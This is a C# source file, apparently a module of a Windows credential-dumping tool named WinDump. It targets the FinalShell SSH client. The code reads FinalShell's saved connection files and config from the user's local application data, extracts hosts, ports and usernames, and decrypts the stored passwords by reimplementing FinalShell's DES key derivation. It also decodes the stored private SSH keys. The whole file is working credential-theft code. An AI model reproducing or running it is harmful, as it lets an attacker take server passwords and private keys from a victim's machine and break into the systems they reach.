using System;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
namespace WinDump
{
    internal class FinalShell
    {
        static readonly Regex reUser = new Regex("\"user_name\":\"(.*?)\"", RegexOptions.Compiled);
        static readonly Regex rePwd = new Regex("\"password\":\"(.*?)\"", RegexOptions.Compiled);
        static readonly Regex reHost = new Regex("\"host\":\"(.*?)\"", RegexOptions.Compiled);
        static readonly Regex rePort = new Regex("\"port\":(.*?),", RegexOptions.Compiled);
        static readonly Regex reKey = new Regex("\"secret_key_id\":\"(.*?)\"", RegexOptions.Compiled);
        static readonly Regex reKeyList = new Regex("\"id\":\"(.*?)\",\"key_data\":\"(.*?)\"", RegexOptions.Compiled);
        internal static DataTable GetFinalShell()
        {
            DataTable dt = new DataTable();
            dt.Columns.Add("Host");
            dt.Columns.Add("Port");
            dt.Columns.Add("User");
            dt.Columns.Add("Pwd");
            dt.Columns.Add("KeyID");
            string connPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\finalshell\conn";
            if (!Directory.Exists(connPath))
            {
                return dt;
            }
            foreach (var file in Directory.GetFiles(connPath, "*.json"))
            {
                var json = File.ReadAllText(file);
                var user = GetGroup(reUser, json);
                var pwd = DecodePass(GetGroup(rePwd, json));
                var host = GetGroup(reHost, json);
                var port = GetGroup(rePort, json);
                var keyid = GetGroup(reKey, json);
                dt.Rows.Add(host, port, user, pwd, keyid);
            }
            return dt;
        }
        internal static DataTable GetFinalShellKey()
        {
            DataTable dt = new DataTable();
            dt.Columns.Add("KeyID");
            dt.Columns.Add("Content");
            string configPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\finalshell\config.json";
            if (!File.Exists(configPath))
            {
                return dt;
            }
            var mc = reKeyList.Matches(File.ReadAllText(configPath));
            foreach (Match m in mc)
            {
                var key = Encoding.UTF8.GetString(Convert.FromBase64String(m.Groups[2].Value));
                dt.Rows.Add(m.Groups[1], key);
            }
            return dt;

        }
        internal static string GetGroup(Regex re, string text)
        {
            var m = re.Match(text);
            if (m.Success)
            {
                return m.Groups[1].Value;
            }
            return "";
        }
        internal static byte[] desDecode(byte[] data, byte[] head)
        {
            byte[] TripleDesIV = { 0, 0, 0, 0, 0, 0, 0, 0 };
            byte[] key = new byte[8];
            Array.Copy(head, key, 8);
            DESCryptoServiceProvider des = new DESCryptoServiceProvider();
            des.Key = key;
            des.IV = TripleDesIV;
            MemoryStream ms = new MemoryStream();
            CryptoStream cs = new CryptoStream(ms, des.CreateDecryptor(), CryptoStreamMode.Write);
            cs.Write(data, 0, data.Length);
            cs.FlushFinalBlock();
            return ms.ToArray();
        }

        internal static string DecodePass(string data)
        {
            if (data.Length == 0)
            {
                return data;
            }
            else
            {
                byte[] buf = Convert.FromBase64String(data);
                byte[] head = new byte[8];
                Array.Copy(buf, 0, head, 0, head.Length);
                byte[] d = new byte[buf.Length - head.Length];
                Array.Copy(buf, head.Length, d, 0, d.Length);
                byte[] randombytes = ranDomKey(head);
                byte[] bt = desDecode(d, randombytes);
                return Encoding.UTF8.GetString(bt);

                
            }
        }
        static byte[] ranDomKey(byte[] head)
        {
            long ks = 3680984568597093857L / new JavaRng(head[5]).nextInt(127);
            JavaRng random = new JavaRng(ks);
            int t = head[0];

            for (int i = 0; i < t; ++i)
            {
                random.nextLong();
            }

            long n = random.nextLong();
            JavaRng r2 = new JavaRng(n);
            long[] ld = new long[] { (long)head[4], r2.nextLong(), (long)head[7], (long)head[3], r2.nextLong(), (long)head[1], random.nextLong(), (long)head[2] };
            using (MemoryStream stream = new MemoryStream())
            {
                using (BinaryWriter writer = new BinaryWriter(stream))
                {
                    long[] var15 = ld;
                    int var14 = ld.Length;

                    for (int var13 = 0; var13 < var14; ++var13)
                    {
                        long l = var15[var13];

                        try
                        {
                            byte[] writeBuffer = new byte[8];
                            writeBuffer[0] = (byte)(l >> 56);
                            writeBuffer[1] = (byte)(l >> 48);
                            writeBuffer[2] = (byte)(l >> 40);
                            writeBuffer[3] = (byte)(l >> 32);
                            writeBuffer[4] = (byte)(l >> 24);
                            writeBuffer[5] = (byte)(l >> 16);
                            writeBuffer[6] = (byte)(l >> 8);
                            writeBuffer[7] = (byte)(l >> 0);
                            writer.Write(writeBuffer);
                        }
                        catch
                        {
                            return null;
                        }
                    }

                    byte[] keyData = stream.ToArray();
                    keyData = md5(keyData);
                    return keyData;
                }
            }
        }

        internal static byte[] md5(byte[] data)
        {
            try
            {
                MD5 md5Hash = MD5.Create();
                byte[] md5data = md5Hash.ComputeHash(data);
                return md5data;
            }
            catch
            { return null; }
        }

    }
    internal class JavaRng
    {
        public JavaRng(long seed)
        {
            _seed = (seed ^ LARGE_PRIME) & ((1L << 48) - 1);
        }

        public long nextLong()
        {
            return ((long)next(32) << 32) + next(32);
        }

        public int nextInt(int bound)
        {
            if (bound <= 0)
                throw new ArgumentOutOfRangeException("bound", bound, "bound must be positive");

            int r = next(31);
            int m = bound - 1;
            if ((bound & m) == 0)  // i.e., bound is a power of 2
                r = (int)((bound * (long)r) >> 31);
            else
            {
                for (int u = r;
                     u - (r = u % bound) + m < 0;
                     u = next(31))
                    ;
            }
            return r;
        }

        public int NextInt(int n)
        {
            if (n <= 0)
                throw new ArgumentOutOfRangeException("n", n, "n must be positive");

            if ((n & -n) == n)  // i.e., n is a power of 2
                return (int)((n * (long)next(31)) >> 31);

            int bits, val;

            do
            {
                bits = next(31);
                val = bits % n;
            } while (bits - val + (n - 1) < 0);
            return val;
        }

        private int next(int bits)
        {
            _seed = (_seed * LARGE_PRIME + SMALL_PRIME) & ((1L << 48) - 1);
            return (int)((_seed) >> (48 - bits));
        }

        private long _seed;

        private const long LARGE_PRIME = 0x5DEECE66DL;
        private const long SMALL_PRIME = 0xBL;
    }
}
